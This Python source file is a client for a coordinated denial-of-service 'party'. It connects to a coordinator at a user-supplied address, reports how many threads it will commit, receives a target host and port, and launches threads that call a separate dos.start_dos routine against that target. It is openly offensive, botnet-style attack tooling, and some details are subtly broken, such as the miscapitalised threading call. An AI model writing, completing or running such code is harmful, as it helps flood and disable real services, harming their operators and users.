import socket
from . import dos
import threading


def join_party():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    Ip = input("Enter Ip to Connect To DDOS Party !! : ")
    port = int(input("Enter port to Connect To DDOS Party !! : "))
    mainThread = 10
    s.connect((Ip,port))
    print(s.recv(2048).decode())
    # print(s.recv(1024).decode())
    # mainThread = int(input("Enter the main Thread for the attack !! : "))
    thread = str(input("Enter the Total Thread to attack !! : "))
    s.send(thread.encode())
    print(s.recv(1024).decode())
    conf = input("Enter S/N :")
    s.send(conf.encode())
    if(s.recv(1024).decode() == "Started"):
        tar = (s.recv(1024).decode()).split(":")
        target = tar[0]
        tport = tar[1]
        for i in range(0,mainThread):
            th = threading.thread(target=dos.start_dos,args=(thread,target,tport,))
            th.start()
    else:
        print(s.recv(1024).decode())
        print(s.recv(1024).decode())
        s.close()